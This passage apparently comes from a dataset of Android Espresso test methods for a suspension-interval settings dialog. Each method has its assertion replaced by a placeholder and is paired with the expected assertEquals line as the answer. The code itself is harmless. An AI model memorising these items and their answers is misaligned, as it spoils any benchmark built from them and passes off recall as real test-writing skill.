withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 02:32 End: 03:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 03:32 End: 21:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 00:30""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesMinGap() { Interval interval1 = getInterval1(); Time start1 = new Time(); start1.setHour(2); start1.setMinute(30); Time end1 = new Time(); end1.setHour(22); end1.setMinute(0); interval1.setStart(start1); interval1.setEnd(end1); Interval interval3 = getInterval3(); Time end3 = new Time(); end3.setHour(0); end3.setMinute(30); interval3.setEnd(end3); getIntervalDAO().insertInterval(interval1); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_cancel)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 02:30 End: 22:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 00:30""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesMinGapScreenRotation() { Interval interval1 = getInterval1(); Time start1 = new Time(); start1.setHour(2); start1.setMinute(30); Time end1 = new Time(); end1.setHour(22); end1.setMinute(0); interval1.setStart(start1); interval1.setEnd(end1); Interval interval3 = getInterval3(); Time end3 = new Time(); end3.setHour(0); end3.setMinute(30); interval3.setEnd(end3); getIntervalDAO().insertInterval(interval1); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_cancel)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 02:30 End: 22:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 00:30""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesLargestGapAdjustStart() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(12))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(50)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(50))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 12:50 End: 14:50""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesLargestGapAdjustStartScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(12))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(12)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(50)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(50))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 12:50 End: 14:50""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesThresholdGapAdjustStart() { Interval interval1 = getInterval1(); Time start1 = new Time(); start1.setHour(4); start1.setMinute(0); Time end1 = new Time(); end1.setHour(21); end1.setMinute(0); interval1.setStart(start1); interval1.setEnd(end1); Interval interval3 = getInterval3(); Time end3 = new Time(); end3.setHour(0); end3.setMinute(30); interval3.setEnd(end3); getIntervalDAO().insertInterval(interval1); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(2))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(32))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(3)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(3))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(30))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 03:00 End: 03:30""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 04:00 End: 21:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 00:30""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesThresholdGapAdjustStartScreenRotation() { Interval interval1 = getInterval1(); Time start1 = new Time(); start1.setHour(4); start1.setMinute(0); Time end1 = new Time(); end1.setHour(21); end1.setMinute(0); interval1.setStart(start1); interval1.setEnd(end1); Interval interval3 = getInterval3(); Time end3 = new Time(); end3.setHour(0); end3.setMinute(30); interval3.setEnd(end3); getIntervalDAO().insertInterval(interval1); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(2))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(32))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(3)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(3))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(30))); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 03:00 End: 03:30""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 04:00 End: 21:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 00:30""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartValid() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(10)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(30)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:30 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenAdjustStartValidScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(10)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(30)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:30 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
